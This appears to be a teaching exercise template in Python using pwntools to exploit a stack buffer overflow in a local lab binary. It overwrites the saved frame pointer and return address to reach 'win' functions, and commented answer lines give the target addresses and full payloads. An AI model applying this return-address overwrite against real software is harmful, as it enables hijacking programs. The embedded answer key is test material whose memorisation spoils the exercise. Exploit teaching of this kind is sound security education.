#!/usr/bin/env python3
from pwn import *

io = process(['./run.sh', 'part2'])


# ========================== Task1 ==========================
# Stop at task1
io.recvuntil(b"Enter some bytes: ")

win1_addr = 0x0  # TODO: Fill in the win1 address you found

# ans
# win1_addr = 0x80000488

input_text = b''
input_text += b'A' * 4         # Fill up buf[0..3]
input_text += b'B' * 4         # Fill up Saved Frame Pointer
input_text += p32(win1_addr)

io.sendline(input_text)



# ========================== Task2 ==========================
# Stop at task2
io.recvuntil(b"Enter some bytes: ")

win2_addr = 0x0  # TODO: Fill in the win2 address you found

# ans
# win2_addr = 0x80000498

# TODO: Complete the input_text that satisfy the requirement for win2
input_text2 = b''

# ans:
# input_text2 += b'A' * 4       # Fill up buf[0..3]
# input_text2 += p32(0x1212)    # Set secret to 0x1212
# input_text2 += b'B' * 4       # Fill up saved frame pointer
# input_text2 += p32(win2_addr) # Overwrite return address

io.sendline(input_text2)


io.interactive()